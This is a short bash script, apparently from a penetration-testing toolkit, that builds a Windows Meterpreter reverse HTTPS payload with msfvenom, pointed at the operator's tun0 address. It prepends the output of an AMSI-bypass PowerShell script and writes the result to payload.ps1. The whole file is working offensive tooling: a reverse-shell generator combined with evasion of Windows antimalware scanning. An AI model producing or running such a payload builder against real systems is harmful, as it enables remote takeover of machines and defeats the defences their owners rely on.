#! /bin/bash
if [ $# -eq 0 ]
then
  echo "No port specified, defaulting to port 443"
  port="443"
else
  port=$1
fi

#get ip address of tun0
ipaddr="$(ip --brief a | grep tun0 | awk '{print $3}' | sed 's/\/\w\+//g')"
echo "ip: $ipaddr port: $port payload: windows/x64/meterpreter/reverse_https"

head=$(pwsh ./AMSIb64.ps1 -amsi context)
payload=$(msfvenom -p windows -p windows/x64/meterpreter/reverse_https LHOST=$ipaddr LPORT=$port -f psh-reflection)

echo -e $head > payload.ps1
echo -e $payload >> payload.ps1

echo "Finished, payload located at payload.ps1"
